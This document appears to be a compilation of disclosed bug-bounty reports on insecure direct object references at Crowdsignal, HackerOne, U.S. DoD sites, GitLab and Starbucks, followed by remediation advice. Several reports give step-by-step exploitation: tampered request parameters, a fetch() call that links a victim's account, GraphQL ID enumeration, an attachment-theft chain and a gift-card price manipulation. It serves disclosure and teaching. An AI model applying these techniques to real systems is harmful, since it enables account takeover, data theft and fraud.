You can move your contents via `Move to` button at https://app.crowdsignal.com/dashboard
And when you click to `Move to > My Content` you will send a POST request to `/dashboard` like that :

{F893407}

`actionable[]` parameter's value is the content's ID. And if you change this ID to victim's content ID, you will see victim's content at `My Content` page. But you can't see responses or edit it. You can only change status etc if you have a free account.

So I found another way to takeover victim's content completely via team account.
In team accounts, you have another move option that named `Move to another user`. Basically, you can move your contents to users (in your team) .
And if you follow same steps again but with `Move to another user` option, you can see victim's content in your team user's account.

**Please note, content IDs are sequential, so attacker can takeover any content.**

## Steps To Reproduce:
- **With Free account (limited access to victim's content)**
  1. Go to https://app.crowdsignal.com/dashboard
  1. Click to checkbox on your any content and turn on Intercept at Burp Suite
  1. Click to `Move to > My Content`
  1. And change `actionable[]` parameter's value with victim's content ID.
  1. Go to `My Content`.
- **With Team account (full access to victim's content)**
  1. Add your second email on https://app.crowdsignal.com/users/list-users.php and confirm it
  2. Go to https://app.crowdsignal.com/dashboard
  3. Click to checkbox on your any content and turn on Intercept at Burp Suite
  4. Click to `Move to > Move to another user`
  5. Select your second account, click `Move`
  6. Change `actionable[]` parameter's value with victim's content ID.
  7. Go to your second account and check dashboard

### [Security@ email forwarding and Embedded Submission drafts can be used to obtain copy of deleted attachments from other HackerOne users](https://hackerone.com/reports/1034346)

- **Report ID:** `1034346`
- **Severity:** High
- **Weakness:** Insecure Direct Object Reference (IDOR)
- **Program:** HackerOne
- **Reporter:** @jobert
- **Bounty:** - usd
- **Disclosed:** 2020-11-17T00:42:05.672Z
- **CVE(s):** -

**Vulnerability Information:**

HackerOne has a number of ways for hackers to submit security vulnerabilities to a program, two of which are through an embedded submission form and through security@ email forwarding. These two features can be exploited to update a report draft created through security@ email forwarding that does not belong to the attacker. In addition to that, the attacker can exploit these features to obtain copies of orphaned platform attachments that were uploaded through an embedded submission form and don't belong to the attacker.

# Steps to reproduce
The exploit consists of chaining two vulnerabilities. The first one is an oversight in the access control of report drafts created and updated through an embedded submission form. To reproduce this first vulnerability, a victim will have to send an email that forwards all emails to a HackerOne inbox. An example of such an email address is security@hackerone.com, which forwards emails to our own program. When someone sends an email to this address, they'd receive an email similar to this one:

{F1077716}

In the backend, this essentially does two things: it creates a `ReportDraft` object and a corresponding `Invitation` object. The email above contains the secret invitation token for the user to get access to the report draft. As long as the invitation is not accepted, the `ReportDraft` has its `reporter_id` and `tracer` attributes set to `NULL`. When a user would accept the invite, the `reporter_id` attribute would be overwritten with the user's ID who accepted the invitation. For now, let's not accept the invite and dive into the inner workings of embedded submission forms.

Similar to security@ email forwarding, embedded submission forms allow anonymous users to create a `ReportDraft` object in the backend. This object contains the current state of the embedded submission form to avoid data loss in case the user happens to close their window. To avoid unauthorized access to other anonymous users writing a report at the same time, the frontend generates a UUID to keep track of which attachments belong to the draft. The `ReportDraft` stores this UUID in the `tracer` attribute. Only when the user knows the UUID of this draft will it be able to update the draft. Every request triggered for an unauthenticated session in an embedded submission form will submit this UUID for the backend to authorize the user. This is where the first vulnerability is found.

The `Teams::EmbeddedSubmissionsController` implements a number of actions, which one of which is `draft_sync`:

```ruby
# frozen_string_literal: true

module Teams
  class EmbeddedSubmissionsController < ApplicationController
    # ...
    def draft_sync
      draft = Interactors::ReportDrafts::UpdateOrCreate.interact_without_authorization(
        draft_id: report_params[:draft_id],
        # ...
        handle: team.handle,
        # ...
        attachment_ids: report_params[:attachment_ids],
        as_user: current_user,
        tracer: report_params[:tracer],
      )
    # ...
  end
end
```

HackerOne's backend consolidates business logic, input validation, and authorization into service objects called interactors. This particular interactor is called explicitly without any form of authorization. Among a few other attributes, the interaction is given a `draft_id`, `attachment_ids`, `tracer`, and a reference to the `current_user`, which is an instance of a `User` object or an instance of `UserAuthentication::AnonymousUser`. The `handle` attribute that is given is the program's handle based on embedded submission UUID. At this point, the application **should** determine whether the `current_user` OR a valid `tracer` value is present, but this check is missing. This is the first vulnerability. When the interaction is executed, it tries to look up a draft using the following code (see `draft` method):

```ruby
# frozen_string_literal: true

module Interactors
  module ReportDrafts
    class UpdateOrCreate < HackeroneInteractor
      attribute :draft_id, Integer, required: false
      # ...
      attribute :attachment_ids, Array, default: []
      attribute :tracer, String, required: false

      private

      def execute
        return if draft_id && draft.nil?

        draft.update(
          # ...
        )

        draft
      end

      # ...

      def draft
        @draft ||= if draft_id
          ReportDraft.find_by(
            id: draft_id,
            team: team,
            reporter: nil_or_current_user,
            tracer: tracer,
          )
        else
          ReportDraft.find_or_initialize_by(
            team: team,
            reporter: nil_or_current_user,
            tracer: tracer,
          )
        end
      end

      # ...

      def nil_or_current_user
        current_user.is_a?(User) ? current_user : nil
      end
    end
  end
end
```

Stepping through the code, a user can see that if a `draft_id` is present, the system will try to look up a `ReportDraft` object by a tracer UUID and reporter. Going back to the security@ email forwarding, we know that there are `ReportDraft` objects that have a `tracer` or `reported_by_id` attribute set to `NULL`. This means that an attacker can, by guessing a draft ID created through the security@ email forwarding feature, change the contents of a draft by completely removing the `tracer` value from a draft sync that is initiated through the embedded submission form. Here is an excerpt of that request:

```http
POST /80b9bc53-a236-445d-a7e4-553828b7d533/embedded_submissions/draft_sync HTTP/2
Host: hackerone.com
...

{
  "draft_id": "1",
  "title": "This becomes the new title for draft 1",
  "vulnerability_information":"This becomes the new vulnerability information for draft 1"
}
```

Once the victim claims the invitation through the email that was shown earlier, they'll see the updated vulnerability information and title.

{F1077723}

You can see that the interaction passes *all* attributes to the `update` call, see `Interactors::ReportDrafts::UpdateOrCreate#execute`. This means that the attacker can only change *all* attributes, reducing the likelihood of the expoitation. However, due to the fact that this allows an attacker to change report drafts, the impact on the integrity is set to high. It could be used to tamper with drafts that are in the process of being submitted to a live program.

To further increase the severity of the vulnerability, it can be chained with another vulnerability. When a user uploads an attachment through an embedded submission form, it'll create an `Attachment` object that belongs to the `ReportDraft` object. In the backend, its attributes will look like this:

```json
{
  "id": "1",
  "uploaded_by_id": null,
  "attachable_id": 1,
  "attachable_type": "ReportDraft"
}
```

The `attachable_id` and `attachable_type` form a polymorphic relation to any other persistent model in HackerOne's database. As long as the user is working on its report, the attachment references a `ReportDraft` object. On submission, it'll transfer the ownership to the `Report` that was created – this is the report that customers see. ActiveRecord, the ORM HackerOne uses, has logic to (conveniently) disassociate a polymorphic relation when the model referencing the polymorphic relation overwrites the IDs. To show this, consider the following code example:

```ruby
# Create an attachment. At this time, the `attachable_id` and `attachable_type` are set to `NULL`
attachment = Attachment.create!

# Create another attachment. At this time, the `attachable_id` and `attachable_type` are set to `NULL`
another_attachment = Attachment.create!

# Create a report draft and reference the first attachment. The `attachable_id` and `attachable_type` of the attachment are updated to reference the created report draft.
report_draft = ReportDraft.create! attachment_ids: [attachment.id]

# Update the attachment IDs of a report draft. This will do two things:
#   - update `attachment.attachable_id` to `NULL`
#   - update `another_attachment.attachable_type` to `ReportDraft`
#   - update `another_attachment.attachable_id` to `report_draft.id`
report_draft.update! attachment_ids: [another_attachment.id]
```

This means that the `attachment`, as created in the above code example, is not referencing any object at all. There is a code path in HackerOne's platform to get an attachment in this state: upload an attachment using an embedded submission form, then clicking the "X" to remove it, and type one character in the vulnerability information field to trigger a draft sync. This will leave the first attachment in an orphaned state that has its `uploaded_by_id` and `attachable_id` set to `NULL`. Going back to the `Interactors::ReportDrafts::UpdateOrCreate` interactor, there's a method that associates attachments to a `ReportDraft` with the following logic:

```ruby
# ...
def valid_attachments
  (
    draft.attachments.with_attached_file.where(id: attachment_ids) +
    Attachment.with_attached_file.where(
      id: attachment_ids,
      attachable_id: nil,
      uploaded_by: nil_or_current_user,
    )
  ).uniq
end
# ...
```

The code that contains the vulnerability is the second `Attachment` lookup: it selects all attachment objects that don't have an `attachable_id` set and that are uploaded by an anonymous user. This means that any attachment that was uploaded by an anonymous user and removed the attachment from a draft can be associated with the attacker's report draft. There are 823 attachments that match this criteria.

An attacker can exploit this chain using the following steps:

1. in an authenticated session, start typing a report to any program. Observe the network traffic for the `draft_sync` endpoint to determine the latest report draft ID, which is included in the response (e.g. 1).
1. in the same session, upload an attachment and observe which ID was associated (e.g. 5).
1. send an email to the program's email forwarding address (e.g. security@hackerone.com). This will create a report draft with an ID that is one to ~ ten IDs up from the report draft the authenticated user created.
1.  in an incognito browser, go to the program's embedded submission form URL. An example is [HackerOne's own form](https://hackerone.com/80b9bc53-a236-445d-a7e4-553828b7d533/embedded_submissions/new). Start typing and intercept the request to the `draft_sync` endpoint.
1. change the `draft_id` to the ID obtained in step 1 and completely remove the `tracer` value from the request.
1. set the `attachment_ids` to an array containing *all* possible attachment IDs from 1 to the ID obtained in step 2
1. claim the report draft through the invitation you received
1. in the UI, observe that the attachments belonging to the victim are attached to the report draft
1. copy the ID and inline them in the vulnerability information field, e.g. `{F5}`
1. in the report preview section, click the link to obtain a copy of the victim's attachment

## Impact

The first vulnerability can be used to change the contents of a number of draft reports that were created through the security@ email forwarding feature. However, chaining the two vulnerabilities would increase the severity as it would allow an attacker to associate orphaned `Attachment` objects to its own report draft, potentially containing sensitive information. The attacker does not have to be authenticated in order to exploit this vulnerability.

### [IDOR to Account Takeover on https://████/index.html](https://hackerone.com/reports/969223)

- **Report ID:** `969223`
- **Severity:** Critical
- **Weakness:** Insecure Direct Object Reference (IDOR)
- **Program:** U.S. Dept Of Defense
- **Reporter:** @nagli
- **Bounty:** - usd
- **Disclosed:** 2020-09-29T20:30:56.276Z
- **CVE(s):** -

**Vulnerability Information:**

Hello Team!

**Summary:**

I found when you wish to update your profile on https://███████/ after your login through https://██████████/signIn/signIn.html website due to an IDOR.

This IDOR gives you the opportunity to change the origin email for the registered account by changing the ID parameter on the following request, i assume that if i would do it on the id=1 i would takeover the admin account, this is due to not requiring the OLD password to make an email change, aswell as no restriction to make POST actions on different account IDS.


**Description:**

IDOR chained to full Account Takeover on ██████ domain.

Account
## Step-by-step Reproduction Instructions

1. Register an account at https://█████████/signIn/CreateAccount.html (Attacker)
2. Login to your account and go the https://███████/signIn/account page
3. Click on the "update" button located at thetop middle, and capture the request on BURP
4. Now change the ID parameter on the request to the victims, change the email, and you successfully have managed to switch his email.

Request:

███


Video PoC:

█████

## Suggested Mitigation/Remediation Actions

1. Implementing email request change based on OLD password input
2. Returning 403/401 when user account attempts to change another user ID settings.

## Disclaimer

as you might notice the domain is https://██████/signIn/signIn.html when you sign in (.mil site), and it redirects you afterwards to https://██████████/ with the Compromised account, therefore i considered this In Scope.

Best Regards,
Nagli

## Impact

Issuing the malicious request on the victim account ID will lead to account takeover by replacing the email of the victim with the email of the attacker, and requesting a new password using the Forgot password option.

**Summary (team):**

More details about the report could be found at my blogpost:

### [Stealing data from customers.gitlab.com without user interaction](https://hackerone.com/reports/674195)

- **Report ID:** `674195`
- **Severity:** High
- **Weakness:** Insecure Direct Object Reference (IDOR)
- **Program:** GitLab
- **Reporter:** @rpadovani
- **Bounty:** - usd
- **Disclosed:** 2020-08-26T14:02:00.620Z
- **CVE(s):** -

**Vulnerability Information:**

### Summary

An attacker can link her own customers.gitlab.com account to the one of the victim, and these give access to 3 different vulnerabilities:
- destroying subscriptions of the victim
- buying new subscriptions using victim credit card for its own groups
- some (minor) information disclosure about what is over Gitlab.com

### Steps to reproduce

The attacker registers herself on customers.gitlab.com, logging in using her Gitlab.com account. 
After that, she updates her customers.gitlab.com account and link it to the victim's Gitlab account through the victim's account userId (they are sequential and they are not secret, so no problem retrieving it).

This update is quite easy, attacker needs only to copy how "Update Account" HTTP request, and change the `customer%5Buid%5D` field, like this:

```
await fetch("https://customers.gitlab.com/customers", {
    "credentials": "include",
    "referrer": "https://customers.gitlab.com/customers/edit",
    "body": "utf8=%E2%9C%93&_method=patch&authenticity_token=YOquJGc9evhkHMfLOZljuw9OcDn0gtJw8AHPb0yVhyml9q1TISGHa%2FK57DAlg8jB%2BEqvJYYob26BRgx4sZbRzg%3D%3D&customer%5Bfirst_name%5D=Riccardo&customer%5Blast_name%5D=Padovani&customer%5Baddress_1%5D=&customer%5Baddress_2%5D=&customer%5Bcity%5D=Munich&customer%5Bzip_code%5D=81479&customer%5Bcountry%5D=DEU&customer%5Bstate%5D=BY&customer%5Bvat_code%5D=&customer%5Bcompany%5D=Riccardo+Padovani&customer%5Bemail%5D=hackerone1%40rpadovani.com&customer%5Bprovider%5D=gitlab&customer%5Buid%5D=VICTIM_ID",
    "method": "POST",
    "mode": "cors"
});
```

The backend will validate the input, and now the two accounts are somehow linked.

### Impact

- When the victim will login again, all his subscriptions will be lost
- If the victim updates his data after the attack, the attacker account will be updated with the same data, INCLUDING CREDIT CARD. The attacker can now purchase plans using victim's credit card
- Attacker has also a list of teams victim is owner, when she purchases a new plan.

If attacker wants to purchase a plan for her own group, she can nominate victim owner, so now attacker's group will be in the dropdown, buy the plan, remove the victim.

### Examples

I attached a video with all these attacks, sorry but it is a bit messy.
On the left there is victim's browser, on the right attacker's browser. When it appears a console, is for the attacker's browser. The attacker's is in a private session, so it is completely separated from the victim.

0:00-0:10: we see victim has a subscription, and attacker no. They also have different data
0:10-0:40: attacker does a first attack, changing both uid and email, and it doesn't work
0:40-1:10: attacker does a proper attack, changing only uid. Notice how bottom right the Gitlab.com account changes
1:10-1:30: nothing else has changed
1:30-1:50: victim does log out and login again and ALL DATA AND SUBSCRIPTIONS ARE GONE

You can skip to
2:30-2:40: victim updates his data, also attacker's data are updated accordingly
2:40-4:30: victim buys a new subscription 
4:30-5:00: attackers can use victim's credit card

### What is the current *bug* behavior?

customers.gitlab.com user can update its link to Gitlab.com without any verification

### End notes:

I'd like you also reset my customers.gitlab.com accounts, now they are all a bit a mess.

Also, while testing I think I associated my customers.gitlab.com account with Gitlab's account with UID 1 due an error in copy-paste. I removed immediately the link, but maybe you should check if the link is indeed being delete, and say sorry on my behalf to Sid!

I noticed that in the video it appears my CC data - so please do not disclose the issue, also on the Gitlab.com issue tracker, without removing the video first, please!

## Impact

Attackers can steal victim's data, including last 4 numbers of CC, and use victim's CC to buy subscriptions

### [Full Account Take-Over of ████████ Members via IDOR](https://hackerone.com/reports/847452)

- **Report ID:** `847452`
- **Severity:** High
- **Weakness:** Insecure Direct Object Reference (IDOR)
- **Program:** U.S. Dept Of Defense
- **Reporter:** @r00tpgp
- **Bounty:** - usd
- **Disclosed:** 2020-05-14T18:08:23.515Z
- **CVE(s):** -

**Vulnerability Information:**

##Summary
https://███████ is a Social Network Site belonging to US DoD. Membership is open to anyone, I have found a method to fully take-over any members' account by exploiting an IDOR bug in the `██████████` end-point. By changing the following values in the `POST` request to the affected end-point:

`userName`
`originalEmail`
`Email`
`RecoveryEmail`

I am able to add Recovery Email address of my choice, thus, enabling me to send a password reset link to my attacker controlled email address. I have uploaded a video PoC to demo my finding. Note that the following test accounts were used:

###Attacker
login: ████████

###Victim
login: ███████

I added `████` email into the victim account. Note that this only works on victims that have no recovery email address defined or recovery email that are not yet verified. This technique will NOT work on victims' that already have a confirmed recovery email address.

Also note, that I am using multi-containers plugin for Firefox, therefore, each tab represents separate browser session. Finally, note that in my PoC video, I had to insert the victim recovery email link `████████/self?guid=█████████` into the attackers' session because a valid session is required to validate the email. The session does not necessary have to belong to the victims' session to validate.

The IDOR bug can be obtained by intercepting the 2-FA Authentication switch:

███


## Vulnerable End-Point

Here is the vulnerable POST request when captured, the cookies and `__RequestVerificationToken` must be valid for this attack to work, I have ==highlighted== the vulnerable IDOR parameters:

## Impact

An attacker can add his email address into the recovery field of any █████████ member that has not yet defined or verified a Recovery Email address. He will then be able to force a password reset link to be sent to his email address and change the victims' password and login into victims' account. Attacker now has full control of victims' account.

Also, victim login id is easily retrievable from this end point. By running the `RequesteeId` using any valid user session, attacker is  able to retrieve the `ProfileUrl` containing the victims' login id.

### [████ █████ exposes highly sensitive information to public](https://hackerone.com/reports/388554)

- **Report ID:** `388554`
- **Severity:** Critical
- **Weakness:** Insecure Direct Object Reference (IDOR)
- **Program:** U.S. Dept Of Defense
- **Reporter:** @cablej_dds
- **Bounty:** - usd
- **Disclosed:** 2020-05-11T16:43:33.681Z
- **CVE(s):** -

**Vulnerability Information:**

**Summary:**

www.██████ is a system used by ██████ for vendors to upload details of their technology for review by ███. Due to an insecure direct object reference vulnerability, all vendor uploads are accessible to the public, without authentication. This includes `Unclass//FOUO` documents, documents labeled `ITAR RESTRICTED / EXPORT CONTROLLED DATA`, and confidential / proprietary data of the respective vendors. These documents include detailed specifications on military technology, including weapons systems, surveillance systems, missiles and ballistics, and other confidential technology.

For instance, several documents contained had labeled criminal penalties for foreign export:

```
WARNING – This document contains technical data whose export is restricted by the Arms Export Control Act (Title 22, U.S.C., Sec 2751 et seq.) or the Export Administration Act of 1979, (Title 50, U.S.C., App. 2401 et seq.), as amended. Violations of these export laws are subject to severe criminal penalties. Disseminate in accordance with provisions of DoD Directive 5230.25.
```

Although I did not identify any classified documents, there is a possibility that classified information is also uploaded here.

## Step-by-step Reproduction Instructions

1. Visit `https://www.███/api/document/x`, replacing `x` with any numerical ID. These go into the low tens of thousands.
2. Observe that the document will be downloaded, provided it exists.
3. Observe that this can be repeated for tens of thousands of documents.

Some screenshots of evidence of sensitive information attached.

## Impact

This exposes highly sensitive information of both the DoD (ITAR restricted) and proprietary/confidential company information.

### [Thailand - Insecure Direct Object Reference permits an unauthorized user to transfer funds from a victim using only the victims Starbucks card](https://hackerone.com/reports/766437)

- **Report ID:** `766437`
- **Severity:** High
- **Weakness:** Insecure Direct Object Reference (IDOR)
- **Program:** Starbucks
- **Reporter:** @nnez
- **Bounty:** - usd
- **Disclosed:** 2020-02-11T21:58:52.485Z
- **CVE(s):** -

**Summary (team):**

nnez discovered that a hacker could transfer funds from one Starbucks card to another by inspecting the form with Google Chrome DevTools and then change the forms "CardNumber" value to a victim's valid Starbucks card number. If the value entered for the "FullAmount" form field did not exceed the actual victim's Starbucks card balance, the transfer would generate an error message but successfully transfer the "FullAmount" value which could be validated by navigating back to the Card Information page.

### [Importing GitLab project archives can replace uploads of other users](https://hackerone.com/reports/534794)

- **Report ID:** `534794`
- **Severity:** High
- **Weakness:** Insecure Direct Object Reference (IDOR)
- **Program:** GitLab
- **Reporter:** @ajxchapman
- **Bounty:** - usd
- **Disclosed:** 2019-12-11T10:39:45.788Z
- **CVE(s):** CVE-2019-5469

**Vulnerability Information:**

### Summary
Importing a modified exported GitLab project archive can overwrite uploads for other users.  If the `secret` and `file name` of an upload are known (these can be easily identified for any uploads to public repositories), any user can import a new project which overwrites the served content of the upload with arbitrary content.

This issue could be abused to backdoor project compiled binaries, allowing the spread of malware.

I have not performed a full risk assessment or root cause analysis of this issue at this time. I wanted to get the issue reported to GitLab asap after discovery. If you require any further details or information please let me know.

### Steps to reproduce
See the video below for an example of this issue:
{F466353}

The video shows the following steps:
1. As user `root` (on the left hand side of the video), create a new project
1. Upload a file to the project (e.g. by creating a new issue)
1. Take note of the file `secret` and `file name` of the original upload
1. Craft a GitLab project export tar.gz with the replacement upload file with a path equal to the original upload `secret` and `file name`, e.g. `./uploads/ed5ab56bc85699117ba230eb799fd3bf/indi.jpg` (See {F466355} attached)
1. As user `test` (on the right hand side of the video) create a new project, importing the crafted tar.gz from the above step
1. As the user `root` refresh your view of the upload file, and note that it has been modified

This example was demonstrated against the official GitLab docker image from https://hub.docker.com/r/gitlab/gitlab-ce/.

### Impact
Any upload type can be replaced using this method, if the `secret` and `file name` are known (these can be easily identified for any uploads to public repositories). An attacker could abuse this to backdoor project compiled binaries, allowing the spread of malware.



### Examples
See the attached project files:
1. Origin project export {F466356}
1. Modified project export used to change the upload file {F466355}

### What is the current *bug* behavior?
Importing a project as any user can modify the served upload files of other users.

### What is the expected *correct* behavior?
Importing a project should not be able to modify the served upload files of other users.

### Relevant logs and/or screenshots
See the following `/var/log/gitlab/gitlab-rails/production.log` entry:
```log
Started GET "/root/new_project/uploads/ed5ab56bc85699117ba230eb799fd3bf/indi.jpg" for 127.0.0.1 at 2019-04-10 23:07:12 +0000

Note that the request was for the `/root/new_project/uploads/ed5ab56bc85699117ba230eb799fd3bf/indi.jpg` file, however the file from the `test/modified_project` was  served.

### [IDOR on DoD Website exposes FTP users and passes linked to all accounts!](https://hackerone.com/reports/228383)

- **Report ID:** `228383`
- **Severity:** High
- **Weakness:** Insecure Direct Object Reference (IDOR)
- **Program:** U.S. Dept Of Defense
- **Reporter:** @cdl
- **Bounty:** - usd
- **Disclosed:** 2019-10-04T15:21:57.473Z
- **CVE(s):** -

**Vulnerability Information:**

**Description:**
https://████/██████/ is vulnerable to Insecure Direct Object Reference. The application does not validate whether or not who a Push Server belongs to thus allowing an attacker to view the credentials of any FTP / sFTP server linked to any user's account. 

## Impact
An attacker can view anybody's FTP server information, thus **compromising** the user's FTP servers. This also allows an attacker to **update** or **edit** the Push Server in the ██████████ CMS.

## Step-by-step Reproduction Instructions
1. Log into or create an account on `https://██████████/██████████`
2. Now visit `https://████████/█████/filepush/ftp/303/` 

You will be able to see my ftp server details and you will be able to update or delete it!

An attacker can bruteforce the id to see if the server gives back a valid response. The attacker can then log into the person's FTP servers with the credentials stolen using this vulnerability, giving them full access to private / confidential information!

Example: `https://██████████/█████████/filepush/ftp/1/`

Hostname: ██████
Username: ██████
Password: █████
Path: /from_pub/cr/████████

`https://█████████/████/filepush/ftp/<ID>/`

## Suggested Mitigation/Remediation Actions
Check whether or the user's account should have access to the specified Push Server

As described on ██████████ website, this includes documents with classifications up to FOUO, including PII / PHI Privacy Act data, and documents classified `FOUO//CLOSE HOLD`, `FOUO//SENSITIVE`, and `FOUO//LIMITED DISTRIBUTION DOCUMENT`.

Additionally, █████ enforces CAC pickup requirements to require users to first authorize via CAC. This too, can be bypassed, allowing an attacker to download any file sent over ████.

Note that in addition to this vulnerability, other IDORs exist in sensitive areas, such as confirming email addresses, allowing an attacker to pretend to send documents from any email address.

## Impact

Based on analysis of file ids, over 2000 documents are uploaded per hour to ███. When combined with a ██████, this exposes over 500,000 recent documents and new documents that are sent every hour. Additionally, as metadata for historical documents is not purged, this also includes details such as sender names/emails, file descriptions, and share dates for over 15 million past documents.

## Step-by-step Reproduction Instructions

1. Visit████/Default.aspx and proceed to send a file to yourself.
2. Click through the verification email and verify the file.
3. Log in to the Package Status page at███/StatusLogIn.aspx?PackageID=x using the provided password.
4. Intercept the request to add a new recipient via the recipients list, entering your email address as the email to add. This is a `POST` request to `POST /████████/Status.aspx?ID=x`.
5. Modify the `ID` parameter to any other number, e.g. decrement the number by 1.
6. Observe that the package will be sent to your email, which can then be downloaded using the provided password.
7. Repeat with any numeric ID to download hundreds of thousands of files.

To bypass CAC authentication:

A user can elect to require CAC authentication when downloading a file. This can be bypassed via the normal file download flow.

1. Visit█████/███?id=15745307 (the initial file ID here does not matter).
2. Enter the password emailed for the file that requires CAC authentication.
3. Intercept the request to submit the form. Replace the `id` parameter in the url with the id of the file with CAC authentication.
4. Observe that the file's information will be displayed and can be downloaded.

## Suggested Mitigation/Remediation Actions
- Ensure that a user can only modify their own packages
- Ensure that a file cannot be downloaded without CAC authentication
- Ensure that a user can only verify their own packages.

### [███████ Site Exposes █████████ forms](https://hackerone.com/reports/395246)

- **Report ID:** `395246`
- **Severity:** Critical
- **Weakness:** Insecure Direct Object Reference (IDOR)
- **Program:** U.S. Dept Of Defense
- **Reporter:** @cablej_dds
- **Bounty:** - usd
- **Disclosed:** 2019-04-05T19:45:03.914Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary

The █████ site (https://██████.mil/) allows authenticated users to submit ██████ e-forms. Due to a vulnerability in this system, any authenticated user can access the full █████████ e-form of any other user.

## Steps to reproduce

1. Intercept an authenticated request on █████████ containing an Authorization header.
2. Replace the url with `█████████`. Observe that the id in the url can be incremented/decremented to view recently generated OMPFs.
3. Upon submitting the request, the user's full ███████ form JSON response will be sent.

## Impact

Access to ████ is possible through either a Department of Defense Self-Service logon, CAC card, or █████████password. Thus, a compromise of a single account on any of these systems would allow for unrestricted access to all ████ forms.

The ████ form includes the following
- PII such as SSN, DoB, addresses, etc
- Personal remarks
- Other fields related to security clearances, education, maritial status, etc

### [Embedded submission form UUIDs can be enumerated through GraphQL node interface, exposing sensitive program details](https://hackerone.com/reports/447930)

- **Report ID:** `447930`
- **Severity:** High
- **Weakness:** Insecure Direct Object Reference (IDOR)
- **Program:** HackerOne
- **Reporter:** @jobert
- **Bounty:** - usd
- **Disclosed:** 2019-01-11T21:37:05.439Z
- **CVE(s):** -

**Vulnerability Information:**

It's possible for an attacker to enumerate embedded submission form UUIDs through HackerOne's GraphQL node interface. In normal application behavior, an embedded submission form is queried through GraphQL with a UUID. These UUIDs are random and they're not susceptible to brute force attacks. However, the UUID is not the primary key of these models. Instead, in the backend, it still has an auto incremental primary key. Because of that they can be queried directly using the node interface. From the node interface, the UUID is exposed, which can then be used to obtain the same information an invited reporter can access.

# Proof of concept
In order to reproduce the vulnerability, follow the steps below.

 - consider the following node ID: `Z2lkOi8vaGFja2Vyb25lL0VtYmVkZGVkU3VibWlzc2lvbkZvcm0vOQ==`
 - decode the ID (base64), which will look something like `gid://hackerone/EmbeddedSubmissionForm/9`
 - change the primary key identifier, and base64 encode it
 - execute the following GraphQL query:

**Request**
```
query {
  node(id: "Z2lkOi8vaGFja2Vyb25lL0VtYmVkZGVkU3VibWlzc2lvbkZvcm0vOQ==") {
    ... on EmbeddedSubmissionForm {
      uuid
    }
  }
}
```

**Response**
```json
{
  "data": {
    "node": {
      "id": "Z2lkOi8vaGFja2Vyb25lL0VtYmVkZGVkU3VibWlzc2lvbkZvcm0vOQ==",
      "uuid": "████"
    }
  }
}
```

 - take the UUID, and append `?embedded_submission_form_uuid=:uuid` to the GraphQL request
 - submit the following query to obtain the program information:

**Request**
```
POST /graphql?embedded_submission_form_uuid=█████████ HTTP/1.1
Host: hackerone.com
...

{"query":"query { node(id: \"Z2lkOi8vaGFja2Vyb25lL0VtYmVkZGVkU3VibWlzc2lvbkZvcm0vOQ==\") { ... on EmbeddedSubmissionForm { id, uuid team { handle policy } }}}","variables":{}}
```

**Response**
```json
{
  "data": {
    "node": {
      "id": "Z2lkOi8vaGFja2Vyb25lL0VtYmVkZGVkU3VibWlzc2lvbkZvcm0vOQ==",
      "uuid": "███",
      "team": {
        "handle": "██████████",
        "policy": "The policy."
      }
    }
  }
}
```

## Impact

Any unauthenticated user can obtain the same information about a private program as a participating hacker. This may reveal sensitive information about private programs on HackerOne, such as their policy, terms, resolved bug count, bounty table, etc.

There are essentially two vulnerabilities here: the ability to directly query the `EmbeddedSubmissionForm` object and the fact that by specifying a UUID, the `Team` object exposes too much information.

### [Able to purchase a gift card with any amount](https://hackerone.com/reports/316789)

- **Report ID:** `316789`
- **Severity:** High
- **Weakness:** Insecure Direct Object Reference (IDOR)
- **Program:** Starbucks
- **Reporter:** @qwacsawd
- **Bounty:** - usd
- **Disclosed:** 2018-07-20T20:10:42.471Z
- **CVE(s):** -

**Vulnerability Information:**

**Description**
There is a vulnerability in card.starbucks.com.sg that allows an attacker to modify the purchasing value of a starbucks gift card such that he is paying the minimum amount for the maximum value of the gift card.

**Attack Summary**
An attacker is able to pay $0.01 for a $100 gift card and gift the card to himself thus allowing him to use the card.

**Steps to Reproduce**
1)Visit https://card.starbucks.com.sg/egift/cards.php?cat=Singapore%20Exclusive
2)Fill in the relevant values, set the emails to your starbucks account email and the input value to $300 at the start
3)Use a web proxy to monitor the web traffic and click on the check out button.
4)Change the original values of the request from 
txtAmount=300&amount=300&txtCustomAmount=300 to txtAmount=0.1&amount=0.1&txtCustomAmount=0.1 and submit the request
5)An encoded string of the value 0.1 will be displayed in the following request as vpc_Amount=XcfYhTj%2BHFIY5c9n8sSCzqDFAxXGgXXoZgF0VVUBvjM%3D, where =XcfYhTj%2BHFIY5c9n8sSCzqDFAxXGgXXoZgF0VVUBvjM%3D is the value 0.1
5)Copy that string and drop the entire request
7)Repeat step 1 to 4, this time change ONLY the value in the variable "amount" so the request would look like this:
txtAmount=300&amount=300&txtCustomAmount=300 to txtAmount=300&amount=0.1&txtCustomAmount=300
8)Proceed to click on the check out button and you will be brought from https://card.starbucks.com.sg/egift/checkout.php to https://card.starbucks.com.sg/egift/payment.php where the vpc_Amount is showed in the request. Change the original vpc_Amount value to the copied string XcfYhTj%2BHFIY5c9n8sSCzqDFAxXGgXXoZgF0VVUBvjM%3D
9)Proceed on to submit the request and you will be brought over to the payment page by either visa/mastercard
10)Continue payment as per usual and you will be paying $0.1 for a $300 starbucks card.
11)Since the recipient email is the attacker's email he checks his email to redeem the card and adds it into his starbucks account.
12)The attacker now has a $300 starbucks gift card that he only paid $0.1 for.

## Impact

By abusing this function, an attacker could gain unlimited values for his starbucks card.

Remediation
---
Preventing insecure direct object references requires selecting an approach for protecting each user accessible object (e.g., object number, filename):
1. Use per user or session indirect object references. This prevents attackers from directly targeting unauthorized resources. For example, instead of using the resource’s database key, a drop down list of six resources authorized for the current user could use the numbers 1 to 6 to indicate which value the user selected. The application has to map the per-user indirect reference back to the actual database key on the server. OWASP’s ESAPI includes both sequential and random access reference maps that developers can use to eliminate direct object references.
2. Check access. Each use of a direct object reference from an untrusted source must include an access control check to ensure the user is authorized for the requested object.
